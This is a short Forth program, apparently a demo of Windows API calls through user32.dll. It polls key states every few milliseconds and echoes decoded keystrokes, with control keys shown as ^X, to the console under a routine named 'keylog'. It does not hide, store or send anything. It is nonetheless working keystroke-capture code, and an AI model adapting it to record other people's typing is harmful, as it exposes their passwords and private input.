loadlib user32.dll
value user32
user32 1 dllfun GetKeyState GetKeyState
user32 2 dllfun MapVirtualKey MapVirtualKeyA
user32 5 dllfun ToAscii ToAscii

create keystate 256 allot does> swap + ;

: set       -1 swap c! ;
: unset     0 swap c! ;
: isdown?   GetKeyState $8000 and ;
: wasdown?  dup keystate c@ ;

: decode    dup 0 MapVirtualKey 0 keystate here 0 ToAscii ;

: .nl?      dup 13 = if cr then ;
: .control  +rev [char] ^ emit 64 + emit -rev ;
: print?    dup 32 < if .control else emit then ;
: report    decode if here c@ .nl? print? then ; 

: isdown    wasdown? if drop else dup keystate set report then ;
: testkey   dup isdown? if isdown else keystate unset then ;
: testkeys  256 0 do i testkey loop ;

: keylog    consume begin key? until testkeys 5 ms repeat ;
: keylog    .pre keylog .post ;
